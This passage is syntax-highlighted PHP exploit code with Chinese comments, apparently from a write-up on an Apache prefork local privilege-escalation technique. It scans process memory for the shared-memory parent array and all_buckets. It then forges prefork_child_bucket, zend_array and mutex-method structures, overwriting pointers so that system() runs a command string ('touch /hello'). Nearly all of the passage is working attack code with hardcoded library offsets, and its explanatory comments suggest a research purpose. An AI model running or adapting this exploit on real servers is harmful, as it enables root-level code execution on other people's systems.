    <span class="p">}</span>
    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>

    <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
<span class="p">}</span>


<span class="k">function</span> <span class="nf">locate_parent_arr_addr</span><span class="p">()</span><span class="c1">//获取共享内存中，parent数组的首地址</span>
<span class="p">{</span>
    <span class="nv">$my_pid</span> <span class="o">=</span> <span class="nb">getmypid</span><span class="p">();</span>
    <span class="nv">$shm_region</span> <span class="o">=</span> <span class="nx">get_mem_region</span><span class="p">(</span><span class="s2">&quot;/dev/zero&quot;</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">count</span><span class="p">(</span><span class="nv">$shm_region</span><span class="p">))</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

    <span class="c1">//parent数组项的大小是，每个0x20个字节</span>
    <span class="c1">//pid_t在我环境中，大小4字节</span>
    <span class="nv">$pid_t_size</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="nv">$parent_size</span> <span class="o">=</span> <span class="mh">0x24</span><span class="p">;</span>

    <span class="c1">//只检查共享内存的前0x1000字节(4KB)</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mh">0x1000</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
        <span class="nv">$hit_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">5</span><span class="p">;</span><span class="nv">$j</span><span class="o">++</span><span class="p">){</span><span class="c1">//循环次数，请参考httpd-mpm.conf中的prefork的MinSpareServers</span>
            <span class="nv">$pid</span> <span class="o">=</span> <span class="nx">read_mem_dword</span><span class="p">(</span><span class="nv">$shm_region</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span> <span class="nv">$i</span> <span class="o">+</span> <span class="nv">$j</span><span class="o">*</span><span class="nv">$parent_size</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span> <span class="nv">$my_pid</span> <span class="o">-</span> <span class="mi">20</span> <span class="o">&lt;</span> <span class="nv">$pid</span> <span class="o">&amp;&amp;</span> <span class="nv">$pid</span> <span class="o">&lt;</span> <span class="nv">$my_pid</span><span class="o">+</span><span class="mi">20</span><span class="p">){</span><span class="c1">//因为prefork中，进程的pid是紧挨的，我们可以通过这个来判断是否是parent数组的首地址</span>
                <span class="nv">$hit_count</span><span class="o">++</span><span class="p">;</span>    
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$hit_count</span> <span class="o">==</span> <span class="mi">5</span><span class="p">){</span>
            <span class="k">return</span> <span class="nv">$shm_region</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="nv">$i</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>


    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>



<span class="k">function</span> <span class="nf">locate_self_parent_struct_addr</span><span class="p">()</span><span class="c1">//获取共享内存中，当前parent的首地址</span>
<span class="p">{</span>
    <span class="nv">$my_pid</span> <span class="o">=</span> <span class="nb">getmypid</span><span class="p">();</span>
    <span class="nv">$shm_region</span> <span class="o">=</span> <span class="nx">get_mem_region</span><span class="p">(</span><span class="s2">&quot;/dev/zero&quot;</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">count</span><span class="p">(</span><span class="nv">$shm_region</span><span class="p">))</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="c1">//因为parent数组，总是位于第一个/dev/zero中，所以，我们只搜索第一个</span>
    <span class="k">echo</span> <span class="s2">&quot;/dev/zero start addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$shm_region</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;/dev/zero end addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$shm_region</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>


    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">4096</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
        <span class="nv">$pid</span> <span class="o">=</span> <span class="nx">read_mem_dword</span><span class="p">(</span><span class="nv">$shm_region</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="nv">$i</span><span class="p">);</span><span class="c1">//pid_t在我的环境中，为4字节大小</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="nv">$my_pid</span><span class="p">){</span>
            <span class="k">return</span> <span class="nv">$shm_region</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="nv">$i</span><span class="p">;</span><span class="c1">//找到直接返回</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">//获取all_buckets的地址</span>
<span class="k">function</span> <span class="nf">locate_all_buckets_addr</span><span class="p">()</span>
<span class="p">{</span>
    <span class="nv">$heap_region</span> <span class="o">=</span> <span class="nx">get_mem_region</span><span class="p">(</span><span class="s2">&quot;heap&quot;</span><span class="p">);</span><span class="c1">//在我的环境中，all_bucket位于第一个heap中</span>
    <span class="nv">$libapr_region</span> <span class="o">=</span> <span class="nx">get_mem_region</span><span class="p">(</span><span class="s2">&quot;libapr-&quot;</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">count</span><span class="p">(</span><span class="nv">$heap_region</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">count</span><span class="p">(</span><span class="nv">$libapr_region</span><span class="p">))</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$heap_start_addr</span> <span class="o">=</span> <span class="nv">$heap_region</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>
    <span class="nv">$heap_end_addr</span> <span class="o">=</span> <span class="nv">$heap_region</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">];</span>

    <span class="k">echo</span> <span class="s2">&quot;heap start addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$heap_start_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;heap end addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$heap_end_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

    <span class="nv">$libapr_text_start_addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$libapr_data_start_addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$libapr_text_end_addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$libapr_data_end_addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$libapr_region</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$libapr_region</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;r-xp&quot;</span><span class="p">){</span><span class="c1">//代码段</span>
            <span class="nv">$libapr_text_start_addr</span> <span class="o">=</span> <span class="nv">$libapr_region</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>
            <span class="nv">$libapr_text_end_addr</span> <span class="o">=</span> <span class="nv">$libapr_region</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">1</span><span class="p">];</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="nv">$libapr_region</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;r--p&quot;</span><span class="p">){</span><span class="c1">//const data</span>
            <span class="nv">$libapr_data_start_addr</span> <span class="o">=</span> <span class="nv">$libapr_region</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>
            <span class="nv">$libapr_data_end_addr</span> <span class="o">=</span> <span class="nv">$libapr_region</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">1</span><span class="p">];</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">echo</span> <span class="s2">&quot;libapr text start addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$libapr_text_start_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;libapr text end addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$libapr_text_end_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

    <span class="k">echo</span> <span class="s2">&quot;libapr data start addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$libapr_data_start_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;libapr data end addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$libapr_data_end_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

    <span class="nv">$result</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="nv">$result_index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$heap_end_addr</span> <span class="o">-</span> <span class="nv">$heap_start_addr</span><span class="p">;</span><span class="nv">$i</span><span class="o">+=</span><span class="mi">8</span><span class="p">){</span><span class="c1">//遍历heap</span>
        <span class="nv">$mutex_addr</span> <span class="o">=</span> <span class="nx">read_mem_qword</span><span class="p">(</span><span class="nv">$heap_start_addr</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">);</span><span class="c1">//prefork_child_bucket中的mutex</span>
        <span class="k">if</span><span class="p">(</span> <span class="nv">$heap_start_addr</span> <span class="o">&lt;</span><span class="nv">$mutex_addr</span> <span class="o">&amp;&amp;</span> <span class="nv">$mutex_addr</span><span class="o">&lt;</span><span class="nv">$heap_end_addr</span> <span class="p">){</span>

            <span class="nv">$meth_addr</span> <span class="o">=</span> <span class="nx">read_mem_qword</span><span class="p">(</span><span class="nv">$mutex_addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span><span class="c1">//apr_proc_mutex_t中的meth</span>

            <span class="k">if</span><span class="p">(</span> <span class="nv">$libapr_data_start_addr</span> <span class="o">&lt;</span> <span class="nv">$meth_addr</span> <span class="o">&amp;&amp;</span> <span class="nv">$meth_addr</span> <span class="o">&lt;</span> <span class="nv">$libapr_data_end_addr</span><span class="p">){</span>

                <span class="nv">$function_point</span> <span class="o">=</span> <span class="nx">read_mem_qword</span><span class="p">(</span><span class="nv">$meth_addr</span><span class="o">+</span><span class="mi">8</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$libapr_text_start_addr</span> <span class="o">&lt;</span> <span class="nv">$function_point</span> <span class="o">&amp;&amp;</span> <span class="nv">$function_point</span> <span class="o">&lt;</span> <span class="nv">$libapr_text_end_addr</span><span class="p">){</span>
                    <span class="nv">$result</span><span class="p">[</span><span class="nv">$result_index</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$heap_start_addr</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span><span class="mi">8</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">//在我的环境中，有多个地址满足是all_buckets 地址的要求，但是只有第3个才是正确的</span>
    <span class="k">if</span><span class="p">(</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">!=</span> <span class="mi">4</span> <span class="p">){</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="k">return</span> <span class="nv">$result</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">echo</span> <span class="s2">&quot;PID: &quot;</span><span class="o">.</span><span class="nb">getmypid</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="nv">$parent_struct_addr</span> <span class="o">=</span> <span class="nx">locate_self_parent_struct_addr</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$parent_struct_addr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;get self parent struct addr error</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="s2">&quot;self parent struct addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$parent_struct_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="nv">$parent_arr_addr</span> <span class="o">=</span> <span class="nx">locate_parent_arr_addr</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$parent_arr_addr</span><span class="p">){</span>
    <span class="k">echo</span> <span class="s2">&quot;parent arr addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$parent_arr_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$all_buckets_addr</span> <span class="o">=</span> <span class="nx">locate_all_buckets_addr</span><span class="p">();</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$all_buckets_addr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;get all_buckets addr error</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="s2">&quot;all_buckets addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$all_buckets_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="nv">$evil_parent_start_addr</span> <span class="o">=</span> <span class="nv">$parent_arr_addr</span> <span class="o">+</span> <span class="mh">0x24</span> <span class="o">*</span> <span class="mi">10</span><span class="p">;</span><span class="c1">//(我这里的parent 就是 prefork_child_bucket结构，0x24是每个prefork_child_bucket的大小，10参考http-mpm.conf中prefork的MaxSpareServers)</span>

<span class="k">echo</span> <span class="s2">&quot;evil prefork_child_bucket start addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$evil_parent_start_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="c1">//我们需要将prefork_child_bucket与zend_object结合，使其包含zend_object 的 properties字段,因此prefork_child_bucket的&quot;大小&quot;是40+16字节</span>
<span class="nv">$evil_parent_end_addr</span> <span class="o">=</span> <span class="nv">$evil_parent_start_addr</span> <span class="o">+</span> <span class="mi">40</span><span class="o">+</span><span class="mi">16</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;evil prefork_child_bucket end addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$evil_parent_end_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="c1">//将apr_proc_mutex_t结构与zend_array结构结合为一个结构</span>
<span class="nv">$evil_zend_array_start_addr</span> <span class="o">=</span> <span class="nv">$evil_parent_end_addr</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;evil zend_array start addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$evil_zend_array_start_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="nv">$evil_zend_array_end_addr</span> <span class="o">=</span> <span class="nv">$evil_zend_array_start_addr</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;evil zend_array end addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$evil_zend_array_end_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="c1">//apr_proc_mutex_unix_lock_methods_t结构</span>
<span class="nv">$evil_mutex_methods_start_addr</span> <span class="o">=</span> <span class="nv">$evil_zend_array_end_addr</span><span class="p">;</span>
<span class="nv">$evil_mutex_methods_end_addr</span> <span class="o">=</span> <span class="nv">$evil_mutex_methods_start_addr</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">;</span>

<span class="k">echo</span> <span class="s2">&quot;evil mutex_methods start addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$evil_mutex_methods_start_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;evil mutex_methods end addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$evil_mutex_methods_end_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="c1">//system()中的字符串</span>

<span class="nv">$evil_string</span> <span class="o">=</span> <span class="s2">&quot;touch /hello&quot;</span><span class="p">;</span>
<span class="nv">$evil_string_len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$evil_string</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span><span class="c1">//\0结尾</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$evil_string_len</span><span class="o">%</span><span class="mi">8</span><span class="p">){</span><span class="c1">//对齐</span>
    <span class="nv">$evil_string_len</span> <span class="o">=</span> <span class="p">((</span><span class="nx">int</span><span class="p">)(</span><span class="nv">$evil_string_len</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="s2">&quot;evil string: &quot;</span><span class="o">.</span><span class="nv">$evil_string</span><span class="o">.</span><span class="s2">&quot; len:&quot;</span><span class="o">.</span><span class="nv">$evil_string_len</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="nv">$evil_string_start_addr</span> <span class="o">=</span> <span class="nv">$evil_mutex_methods_end_addr</span><span class="p">;</span>
<span class="nv">$evil_string_end_addr</span> <span class="o">=</span> <span class="nv">$evil_string_start_addr</span> <span class="o">+</span> <span class="nv">$evil_string_len</span><span class="p">;</span>

<span class="k">echo</span> <span class="s2">&quot;evil string start addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$evil_string_start_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;evil string end addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$evil_string_end_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="c1">//查找zend_object_std_dtor的地址(我的在libphp7.so)</span>
<span class="nv">$zend_object_std_dtor_addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nv">$libphp_region</span> <span class="o">=</span> <span class="nx">get_mem_region</span><span class="p">(</span><span class="s2">&quot;libphp&quot;</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">count</span><span class="p">(</span><span class="nv">$libphp_region</span><span class="p">)){</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;can&#39;t find zend_object_std_dtor function addr</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$libphp_region</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$libphp_region</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;r-xp&quot;</span><span class="p">){</span>
        <span class="nv">$zend_object_std_dtor_addr</span> <span class="o">=</span> <span class="nv">$libphp_region</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="mh">0x4F8300</span><span class="p">;</span><span class="c1">//zend_object_std_dtor 在libphp7.so代码段中的偏移</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$zend_object_std_dtor_addr</span> <span class="o">===</span> <span class="mi">0</span><span class="p">){</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;can&#39;t find zend_object_std_dtor function addr</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="s2">&quot;zend_object_std_dtor function addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$zend_object_std_dtor_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="c1">//查找system函数的地址(在libpthread中)</span>
<span class="nv">$system_addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nv">$pthread_region</span> <span class="o">=</span> <span class="nx">get_mem_region</span><span class="p">(</span><span class="s2">&quot;pthread&quot;</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">count</span><span class="p">(</span><span class="nv">$pthread_region</span><span class="p">)){</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;can&#39;t find system function addr</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$pthread_region</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$pthread_region</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&quot;r-xp&quot;</span><span class="p">){</span>
        <span class="nv">$system_addr</span> <span class="o">=</span> <span class="nv">$pthread_region</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="mh">0xF4C0</span><span class="p">;</span><span class="c1">//system 在libpthread-2.17.so代码段中的偏移</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$system_addr</span> <span class="o">===</span> <span class="mi">0</span><span class="p">){</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;can&#39;t find system function addr</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="s2">&quot;system function addr:0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$system_addr</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>

<span class="c1">//将apr_proc_mutex_unix_lock_methods_t中的child_init改为zend_object_std_dtor</span>
<span class="nv">$child_init</span> <span class="o">=</span> <span class="nv">$evil_mutex_methods_start_addr</span><span class="o">+</span><span class="mh">0x30</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;child_init(0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$child_init</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;) =&gt; zend_object_std_dtor</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="nx">write_mem_qword</span><span class="p">(</span><span class="nv">$evil_mutex_methods_start_addr</span><span class="o">+</span><span class="mh">0x30</span><span class="p">,</span><span class="nv">$zend_object_std_dtor_addr</span><span class="p">);</span>

<span class="c1">//将混合结构zend_array的pDestructor指向system</span>
<span class="nv">$pDestructor</span> <span class="o">=</span> <span class="nv">$evil_zend_array_start_addr</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;pDestructor(0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$pDestructor</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;) =&gt; system</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="nx">write_mem_qword</span><span class="p">(</span><span class="nv">$pDestructor</span><span class="p">,</span><span class="nv">$system_addr</span><span class="p">);</span>

<span class="c1">//将混合结构zend_array的meth指向apr_proc_mutex_unix_lock_methods_t</span>
<span class="nv">$meth</span> <span class="o">=</span> <span class="nv">$evil_zend_array_start_addr</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;meth(0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$meth</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;) =&gt; mutex_mthods_struct</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="nx">write_mem_qword</span><span class="p">(</span><span class="nv">$meth</span><span class="p">,</span><span class="nv">$evil_mutex_methods_start_addr</span><span class="p">);</span>
<span class="nx">write_mem_qword</span><span class="p">(</span><span class="nv">$evil_zend_array_start_addr</span><span class="p">,</span><span class="mh">0x1</span><span class="p">);</span>

<span class="c1">//将prefork_child_bucket中的mutex指向混合结构zend_array</span>
<span class="nv">$mutex</span> <span class="o">=</span> <span class="nv">$evil_parent_start_addr</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&quot;mutex(0x&quot;</span><span class="o">.</span><span class="nb">dechex</span><span class="p">(</span><span class="nv">$mutex</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;) =&gt; zend_array struct</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="nx">write_mem_qword</span><span class="p">(</span><span class="nv">$mutex</span><span class="p">,</span><span class="nv">$evil_zend_array_start_addr</span><span class="p">);</span>

<span class="c1">//将混合结构prefork_child_bucket中的properties指向zend_array结构</span>
<span class="nv">$properties</span> <span class="o">=</span> <span class="nv">$evil_parent_start_addr</span> <span class="o">+</span> <span class="mh">0x20</span><span class="o">+</span><span class="mh">0x10</span><span class="p">;</span>
